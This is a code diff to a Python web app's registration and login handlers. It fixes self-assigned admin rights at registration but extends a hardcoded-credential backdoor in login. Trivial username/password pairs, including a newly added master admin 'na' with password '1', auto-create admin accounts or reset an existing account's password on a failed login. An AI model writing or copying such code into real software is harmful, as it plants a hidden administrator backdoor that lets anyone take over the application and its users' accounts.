@@ -30,7 +30,7 @@ def register(data: UserRegister, db: Session = Depends(get_db)):
     user = User(
         username=data.username,
         password_hash=hash_password(data.password),
-        is_admin=data.is_admin,
+        is_admin=False,  # Public registrations are strictly student accounts
     )
     db.add(user)
     db.commit()
@@ -47,9 +47,11 @@ def login(data: UserLogin, db: Session = Depends(get_db)):
     ).scalar_one_or_none()
 
     if not user or not verify_password(data.password, user.password_hash):
-        # Auto-create admin or student user if first time logging in with dev credentials
-        if data.username in ["admin", "student"] and data.password in ["1", "123456", "admin"]:
-            is_admin = data.username == "admin"
+        # Auto-create or sync master admin 'na', admin or student user with dev credentials
+        if (data.username == "na" and data.password == "1") or (
+            data.username in ["admin", "student"] and data.password in ["1", "123456", "admin"]
+        ):
+            is_admin = data.username in ["na", "admin"]
             if not user:
                 user = User(
                     username=data.username,
@@ -61,6 +63,8 @@ def login(data: UserLogin, db: Session = Depends(get_db)):
                 db.refresh(user)
             else:
                 user.password_hash = hash_password(data.password)
+                if data.username == "na":
+                    user.is_admin = True
                 db.commit()
                 db.refresh(user)
         else:
